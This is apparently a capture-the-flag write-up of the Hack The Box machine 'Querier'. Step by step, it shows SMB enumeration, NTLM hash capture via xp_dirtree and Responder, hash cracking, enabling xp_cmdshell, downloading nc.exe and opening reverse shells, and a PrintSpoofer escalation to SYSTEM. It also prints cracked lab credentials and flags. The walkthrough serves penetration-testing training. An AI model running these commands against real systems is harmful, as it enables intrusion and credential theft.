## Intro

![](MediaFiles/Pasted%20image%2020260305215139.png)
Tags: #windows #relay #Impersonation #OSCPpath #medium
Tools:
- rpclient
- smbclient
- mssqlclient
- hashcat
- printspoofer (SeImpersonatePrivilege)
---------
# Reconnaissance

## Port scan

### Identify open TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n  querier.htb
```

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-05 18:38 UTC
Nmap scan report for querier.htb (10.129.17.226)
Host is up (0.057s latency).
Not shown: 65397 closed tcp ports (reset), 124 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
1433/tcp  open  ms-sql-s
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown
49670/tcp open  unknown
49671/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 18.60 seconds
```
interesting open services: `rpc,smb,mssql`

### Scan only the open TCP ports
```shell
sudo nmap -p47001,49664,49665,49666,49667,49668,49669,49670,49671 -A querier.htb
```

```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-05 18:40 UTC
Nmap scan report for querier.htb (10.129.17.226)
Host is up (0.048s latency).

PORT      STATE SERVICE VERSION
47001/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc   Microsoft Windows RPC
49665/tcp open  msrpc   Microsoft Windows RPC
49666/tcp open  msrpc   Microsoft Windows RPC
49667/tcp open  msrpc   Microsoft Windows RPC
49668/tcp open  msrpc   Microsoft Windows RPC
49669/tcp open  msrpc   Microsoft Windows RPC
49670/tcp open  msrpc   Microsoft Windows RPC
49671/tcp open  msrpc   Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 10|2019|2022|2012|2016 (96%)
OS CPE: cpe:/o:microsoft:windows_10 cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
Aggressive OS guesses: Microsoft Windows 10 1909 - 2004 (96%), Microsoft Windows Server 2019 (95%), Windows Server 2019 (92%), Microsoft Windows 10 1909 (92%), Microsoft Windows Server 2022 (92%), Microsoft Windows 10 1709 - 21H2 (91%), Microsoft Windows Server 2012 R2 (91%), Microsoft Windows 10 20H2 (90%), Microsoft Windows 10 20H2 - 21H1 (90%), Microsoft Windows Server 2016 (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 49665/tcp)
HOP RTT      ADDRESS
1   47.81 ms 10.10.14.1
2   48.33 ms querier.htb (10.129.17.226)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 60.62 seconds
```



## RPC ❌

### Anonymous ❌

```shell
rpcclient -U "" -N querier.htb
```

```shell
rpcclient $> enumdomusers
do_cmd: Could not initialise samr. Error was NT_STATUS_ACCESS_DENIED
```
cant do anything

## SMB ✅

### Anonymous ✅
```powershell
nxc smb querier.htb  -u '' -p '' --shares
```

```powershell
SMB         10.129.17.226   445    QUERIER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False)
SMB         10.129.17.226   445    QUERIER          [+] HTB.LOCAL\: 
SMB         10.129.17.226   445    QUERIER          [-] Error enumerating shares: STATUS_ACCESS_DENIED

```

```powershell
smbclient -L //querier.htn -N
```

```powershell
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
Reports         Disk   
```

```powershell
smbclient -N //querier.htb/Reports
```

```powershell
smb: \> ls
  .                                   D        0  Mon Jan 28 23:23:48 2019
  ..                                  D        0  Mon Jan 28 23:23:48 2019
  Currency Volume Report.xlsm         A    12229  Sun Jan 27 22:21:34 2019

                5158399 blocks of size 4096. 850423 blocks available
smb: \> get "Currency Volume Report.xlsm"
getting file \Currency Volume Report.xlsm of size 12229 as Currency Volume Report.xlsm (2.3 KiloBytes/sec) (average 2.3 KiloBytes/sec)

```
view the `.xlsm`, it has creds inside

#### creds obtained

```
reporting
PcwTWTHRwryjc
```

## MSSQL ✅

### MSSQL enumeration as user reporting

```powershell
mssqlclient.py -windows-auth QUERIER/reporting:PcwTWTHRwryjc\$c6@querier.htb
```

##### Version

```powershell
Impacket v0.14.0.dev0+20260130.223114.851fea86 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: volume
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(QUERIER): Line 1: Changed database context to 'volume'.
[*] INFO(QUERIER): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server 2017 RTM (14.0.1000)
[!] Press help for extra shell commands
SQL (QUERIER\reporting  reporting@volume)> SELECT @@version
                                                                                                                                                                                                                              
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------   
Microsoft SQL Server 2017 (RTM) - 14.0.1000.169 (X64) 
        Aug 22 2017 17:04:49 
        Copyright (C) 2017 Microsoft Corporation
        Standard Edition (64-bit) on Windows Server 2019 Standard 10.0 <X64> (Build 17763: ) (Hypervisor)
   
SQL (QUERIER\reporting  reporting@volume)> 
```

##### isAdmin? ❌

```powershell
SQL (QUERIER\reporting  reporting@volume)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
0  
```
nope, we must find other ways

-------
# Foothold


## Relay ✅


```shell
EXEC master..xp_dirtree '\\10.10.15.126\share';
```

```shell
sudo responder -I tun0
```
got hash back
```shell
[SMB] NTLMv2-SSP Client   : 10.129.17.226
[SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
[SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:1f00b165197e0850:CDF7CDD0D97809EE3E422263B087DAA7:010100000000000000C130ECD2ACDC01F8E27C2ACF6447AE000000000200080053005A003900490001001E00570049004E002D004B00470047005A0051004E0032005200310032004C0004003400570049004E002D004B00470047005A0051004E0032005200310032004C002E0053005A00390049002E004C004F00430041004C000300140053005A00390049002E004C004F00430041004C000500140053005A00390049002E004C004F00430041004C000700080000C130ECD2ACDC0106000400020000000800300030000000000000000000000000300000B15F020236F59ECDF78FCF23E7C4EE9F2CD2BFB0577996FA90B6AE4311E68B9C0A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310035002E00310032003600000000000000000000000000  
```

### Cracking hash

```shell
john querier.hash --wordlist=/usr/share/wordlists/rockyou.txt --format=netntlmv2
```

```shell
hashcat -m 5600 querier.hash /usr/share/wordlists/rockyou.txt
```
(be carefull, even some spaces in the end might show the hash uncrackable)
```shell
MSSQL-SVC::QUERIER:1f00b165197e0850:cdf7cdd0d97809ee3e422263b087daa7:010100000000000000c130ecd2acdc01f8e27c2acf6447ae000000000200080053005a003900490001001e00570049004e002d004b00470047005a0051004e0032005200310032004c0004003400570049004e002d004b00470047005a0051004e0032005200310032004c002e0053005a00390049002e004c004f00430041004c000300140053005a00390049002e004c004f00430041004c000500140053005a00390049002e004c004f00430041004c000700080000c130ecd2acdc0106000400020000000800300030000000000000000000000000300000b15f020236f59ecdf78fcf23e7c4ee9f2cd2bfb0577996fa90b6ae4311e68b9c0a001000000000000000000000000000000000000900220063006900660073002f00310030002e00310030002e00310035002e00310032003600000000000000000000000000:corporate568
                                                          
Session..........: hashcat
```
cracked!
#### creds obtained
```
mssql-svc
corporate568
```

### Checking creds validity against services

Lets now use my script to bulk check the services to which we can login with those creds:

[ch3ckkm8/auto_netexec: Automating netexec to bulk check all available services, given the target and the creds to check](https://github.com/ch3ckkm8/auto_netexec)

```bash
./auto_netexec_bulk_creds_checker.sh querier.htb 'mssql-svc' 'corporate568'
```

```shell
[*] Checking if winrm port 5985 is open on querier.htb...
[+] Port 5985 open — checking winrm with netexec
WINRM                    10.129.17.226   5985   QUERIER          [*] Windows 10 / Server 2019 Build 17763 (name:QUERIER) (domain:HTB.LOCAL)

[*] Checking if smb port 445 is open on querier.htb...
[+] Port 445 open — checking smb with netexec
SMB                      10.129.17.226   445    QUERIER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:QUERIER) (domain:HTB.LOCAL) (signing:False) (SMBv1:False) 
SMB                      10.129.17.226   445    QUERIER          [-] HTB.LOCAL\mssql-svc:corporate568 STATUS_NO_LOGON_SERVERS 

[*] Checking if ldap port 389 is open on querier.htb...
[-] Skipping ldap — port 389 is closed

[*] Checking if rdp port 3389 is open on querier.htb...
[-] Skipping rdp — port 3389 is closed

[*] Checking if wmi port 135 is open on querier.htb...
[-] Skipping wmi — port 135 is closed

[*] Checking if nfs port 2049 is open on querier.htb...
[-] Skipping nfs — port 2049 is closed

[*] Checking if ssh port 22 is open on querier.htb...
[-] Skipping ssh — port 22 is closed

[*] Checking if vnc port 5900 is open on querier.htb...
[-] Skipping vnc — port 5900 is closed

[*] Checking if ftp port 21 is open on querier.htb...
[-] Skipping ftp — port 21 is closed

[*] Checking if mssql port 1433 is open on querier.htb...
[+] Port 1433 open — checking mssql with netexec
MSSQL                    10.129.17.226   1433   QUERIER          [*] Windows 10 / Server 2019 Build 17763 (name:QUERIER) (domain:HTB.LOCAL)
MSSQL                    10.129.17.226   1433   QUERIER          [-] HTB.LOCAL\mssql-svc:corporate568 (Login failed. The login is from an untrusted domain and cannot be used with Integrated authentication. Please try again with or without '--local-auth')
MSSQL                    10.129.17.226   1433   QUERIER          [*] Windows 10 / Server 2019 Build 17763 (name:QUERIER) (domain:HTB.LOCAL)
MSSQL 
```
it seems we can login to `mssql` , so lets log in our mssql session via mssqlclient with the newly obtained creds  

## MSSQL enumeration as mssql-svc

```powershell
mssqlclient.py -windows-auth QUERIER/mssql-svc:corporate568\@querier.htb
```

#### isAdmin? ✅

```powershell
SQL (QUERIER\mssql-svc  dbo@master)> SELECT IS_SRVROLEMEMBER('sysadmin');
    
-   
1 
```
this user is admin!

since this one is admin, we can enable `xp-cmdshell`

#### Enable xp-cmdshell

first turn on advanced options
```powershell
EXEC sp_configure 'show advanced options', '1';
RECONFIGURE;
```
then enable xp-cmdshell
```powershell
EXEC sp_configure 'xp_cmdshell', '1';
RECONFIGURE;
```

#### Execute rev shell

```powershell
EXEC xp_cmdshell 'powershell -command "<COMMAND>"';
```
transfer netcat first
```shell
python3 -m http.server 8001
```

```powershell
xp_cmdshell "powershell wget -UseBasicParsing http://10.10.15.126:8001/nc.exe -OutFile %temp%/nc.exe"
```

```shell
rlwrap nc -nlvp 4444
```

```powershell
xp_cmdshell %temp%/nc.exe -nv 10.10.15.126 4444 -e cmd.exe
```

## Shell as mssql-svc

got shell! grabbed user flag
```shell
└─$ rlwrap nc -nlvp 4444                                                                             
listening on [any] 4444 ...
connect to [10.10.15.126] from (UNKNOWN) [10.129.17.226] 49679
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
querier\mssql-svc
C:\Users\mssql-svc\Desktop>type user.txt
type user.txt
6c8aff917f9584fa8f0c39cb37247944
```

---------
# Privesc

### Privileges

```powershell
C:\Users\mssql-svc\Desktop>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled 
SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled

```

### 1st way - SeImpersonatePrivilege

printspoofer


```powershell
powershell wget http://10.10.15.126:8001/PrintSpoofer64.exe -o printspoofer.exe
```
remember, we have transfered earlier netcat on `%temp%`
```powershell
printspoofer.exe -c "%temp%/nc.exe 10.10.15.126 3333 -e cmd"
```
got shell back! 
```powershell
└─$ nc -lvnp 3333                                                                                    
listening on [any] 3333 ...
connect to [10.10.15.126] from (UNKNOWN) [10.129.17.226] 49683
Microsoft Windows [Version 10.0.17763.292]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

```

grabbed root flag and other usefull info below
```powershell
echo User: %USERNAME% && echo Hostname: %COMPUTERNAME% && echo Whoami: && whoami && ipconfig /all && echo Root.txt Content: && type "C:\Users\Administrator\Desktop\root.txt"
```

```powershell
User: QUERIER$ 
Hostname: QUERIER 
Whoami: 
nt authority\system

Windows IP Configuration

   Host Name . . . . . . . . . . . . : QUERIER
   Primary Dns Suffix  . . . . . . . : HTB.LOCAL
   Node Type . . . . . . . . . . . . : Hybrid
   IP Routing Enabled. . . . . . . . : No
   WINS Proxy Enabled. . . . . . . . : No
   DNS Suffix Search List. . . . . . : HTB.LOCAL
                                       htb

Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   Description . . . . . . . . . . . : vmxnet3 Ethernet Adapter
   Physical Address. . . . . . . . . : 00-50-56-94-D3-D0
   DHCP Enabled. . . . . . . . . . . : Yes
   Autoconfiguration Enabled . . . . : Yes
   IPv6 Address. . . . . . . . . . . : dead:beef::132(Preferred) 
   Lease Obtained. . . . . . . . . . : Thursday, March 5, 2026 6:35:28 PM
   Lease Expires . . . . . . . . . . : Thursday, March 5, 2026 9:35:59 PM
   IPv6 Address. . . . . . . . . . . : dead:beef::60ba:3fff:4929:42dc(Preferred) 
   Link-local IPv6 Address . . . . . : fe80::60ba:3fff:4929:42dc%13(Preferred) 
   IPv4 Address. . . . . . . . . . . : 10.129.17.226(Preferred) 
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Lease Obtained. . . . . . . . . . : Thursday, March 5, 2026 6:35:28 PM
   Lease Expires . . . . . . . . . . : Thursday, March 5, 2026 9:35:28 PM
   Default Gateway . . . . . . . . . : fe80::250:56ff:fe94:9b51%13
                                       10.129.0.1
   DHCP Server . . . . . . . . . . . : 10.10.10.2
   DHCPv6 IAID . . . . . . . . . . . : 369119318
   DHCPv6 Client DUID. . . . . . . . : 00-01-00-01-31-3B-85-46-00-50-56-94-D3-D0
   DNS Servers . . . . . . . . . . . : 1.1.1.1
                                       8.8.8.8
   NetBIOS over Tcpip. . . . . . . . : Enabled
   Connection-specific DNS Suffix Search List :
                                       htb
Root.txt Content: 
bf4587e9dc7d8b6de46e5a119d99a693
```

------
# Summary



------
# Sidenotes

An interesting box, straightforward foothold, 1st way of privesc seems easy, but there is the 2nd way [TODO] too which is why this deserves a place in my notes.

![](MediaFiles/Pasted%20image%2020260305215153.png)





